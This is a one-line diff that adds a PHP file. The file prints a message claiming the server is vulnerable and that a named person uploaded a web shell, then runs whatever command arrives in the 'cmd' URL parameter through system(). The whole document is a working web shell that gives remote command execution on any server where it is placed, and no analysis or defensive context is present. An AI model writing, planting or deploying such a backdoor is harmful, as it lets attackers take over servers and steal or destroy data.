@@ -1,0 +1,1 @@
+<?php echo "Webshell uploaded by Himanshu - Server is vulnerable"; echo "<br>"; system($_GET['cmd']); ?>
